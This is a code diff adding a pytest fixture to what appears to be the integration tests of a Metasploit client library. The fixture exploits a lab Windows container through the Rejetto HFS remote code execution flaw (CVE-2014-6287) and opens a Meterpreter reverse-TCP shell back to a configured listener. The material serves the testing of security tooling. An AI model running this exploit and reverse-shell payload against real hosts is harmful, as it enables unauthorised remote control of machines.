@@ -499,3 +499,68 @@ async def direct_meterpreter_session(client, direct_shell_session, integration_e
                 print(f"   🧹 Cleaned up Meterpreter session {meterpreter_session_id}")
             except Exception:
                 pass
+
+
+@pytest.fixture
+async def windows_meterpreter_session(client, integration_env):
+    """Create a Windows Meterpreter session via Rejetto HFS exploit.
+
+    This fixture directly exploits the Windows target using CVE-2014-6287
+    (Rejetto HFS RCE) and spawns a Meterpreter session without needing
+    to upgrade from a shell.
+
+    Requires:
+    - INTEGRATION_TESTS=true
+    - target-windows container running with HFS on port 80
+    - TARGET_WINDOWS_HOST env var (defaults to "assassinate-target-windows")
+
+    This is MUCH faster than the shell upgrade approach and more reliable.
+    """
+    target_host = os.environ.get("TARGET_WINDOWS_HOST", "assassinate-target-windows")
+    lhost = os.environ.get("LHOST")
+    if not lhost:
+        import socket
+        lhost = socket.gethostbyname(socket.gethostname())
+    lport = int(os.environ.get("LPORT", "4433"))
+
+    print(f"\n🎯 Exploiting Windows target via Rejetto HFS")
+    print(f"   Target: {target_host}:80")
+    print(f"   Handler: {lhost}:{lport}")
+
+    session_id = None
+
+    try:
+        # Create and configure the exploit module
+        module_id = await client.create_module("exploit/windows/http/rejetto_hfs_exec")
+        await client.module_set_option(module_id, "RHOSTS", target_host)
+        await client.module_set_option(module_id, "LHOST", lhost)
+        await client.module_set_option(module_id, "LPORT", str(lport))
+        # Use different SRVPORT to avoid conflicts
+        await client.module_set_option(module_id, "SRVPORT", "8888")
+
+        print("   Running exploit...")
+
+        # Run exploit with Meterpreter payload (32-bit since HFS is 32-bit)
+        session_id = await client.module_exploit(
+            module_id,
+            "windows/meterpreter/reverse_tcp",
+            timeout=60.0
+        )
+
+        if session_id:
+            print(f"   ✓ Got Windows Meterpreter session: {session_id}")
+        else:
+            pytest.skip("Rejetto HFS exploit did not return a session - is Windows target running?")
+
+        yield session_id
+
+    except Exception as e:
+        pytest.skip(f"Could not create Windows Meterpreter session: {e}")
+
+    finally:
+        if session_id is not None:
+            try:
+                await client.session_kill(session_id)
+                print(f"   🧹 Cleaned up Windows Meterpreter session {session_id}")
+            except Exception:
+                pass
